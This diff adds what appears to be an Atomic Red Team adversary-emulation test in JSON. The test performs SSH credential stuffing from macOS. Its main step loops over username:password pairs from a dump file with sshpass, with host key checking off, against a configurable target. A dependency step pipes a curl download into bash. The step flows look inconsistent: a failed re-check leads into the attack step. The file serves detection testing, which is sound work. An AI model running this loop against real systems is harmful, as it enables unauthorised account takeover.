@@ -1,0 +1,86 @@
+{
+  "id": "d546a3d9-0be5-40c7-ad82-5a7d79e1b66b",
+  "name": "SSH Credential Stuffing From MacOS",
+  "description": "Using username,password combination from a password dump to login over SSH.\n",
+  "platforms": [
+    "darwin"
+  ],
+  "steps": [
+    {
+      "id": "16fdfc11-f359-48be-960b-3dae5ce56c1d",
+      "type": "execute-command",
+      "data": {
+        "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b024e0e2-aeb9-4343-86ac-3add3dd296fa",
+      "name": "Check dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9b996bfa-cdc1-4446-8633-81506fa721ea",
+      "name": "Resolve dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)\"\nbrew install hudochenkov/sshpass/sshpass\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "90b1e75b-e712-42ba-92fd-2c7b617a86e6",
+      "name": "Re-check dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "b024e0e2-aeb9-4343-86ac-3add3dd296fa",
+      "p": "on-success",
+      "o": "16fdfc11-f359-48be-960b-3dae5ce56c1d"
+    },
+    {
+      "s": "b024e0e2-aeb9-4343-86ac-3add3dd296fa",
+      "p": "on-failure",
+      "o": "9b996bfa-cdc1-4446-8633-81506fa721ea"
+    },
+    {
+      "s": "9b996bfa-cdc1-4446-8633-81506fa721ea",
+      "p": "on-success",
+      "o": "90b1e75b-e712-42ba-92fd-2c7b617a86e6"
+    },
+    {
+      "s": "90b1e75b-e712-42ba-92fd-2c7b617a86e6",
+      "p": "on-failure",
+      "o": "16fdfc11-f359-48be-960b-3dae5ce56c1d"
+    }
+  ],
+  "tags": [
+    "T1110.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_host",
+      "type": "string",
+      "description": "IP Address / Hostname you want to target.",
+      "value": "localhost"
+    }
+  ]
+}
